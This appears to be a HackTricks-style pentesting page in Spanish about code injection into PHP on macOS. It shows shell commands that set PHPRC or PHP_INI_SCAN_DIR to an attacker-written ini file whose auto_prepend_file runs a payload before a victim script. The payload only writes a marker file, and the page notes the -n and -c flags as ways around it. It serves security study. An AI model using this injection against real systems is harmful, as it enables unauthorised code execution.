# Inyección en aplicaciones PHP de macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` y `auto_prepend_file`

PHP CLI y CGI leen la configuración en cada ejecución. `PHPRC` puede seleccionar un `php.ini` legible por el atacante, mientras que `PHP_INI_SCAN_DIR` puede redirigir el directorio donde se buscan archivos `.ini` adicionales. La directiva `auto_prepend_file` hace que PHP analice un archivo antes del script solicitado, por lo que esta combinación se convierte en ejecución de código durante el inicio.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Una alternativa es un directorio que contiene un archivo `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
La opción `-n` ignora `php.ini`; una ruta `-c` de confianza especificada explícitamente tiene prioridad sobre `PHPRC`. Recuerda que un SAPI de servidor de larga duración normalmente lee la configuración cuando se inicia el servidor web, mientras que CLI y CGI lo hacen en cada invocación.<sup>[[1]](#references)</sup>

## References

- [1] [Archivo de configuración de PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
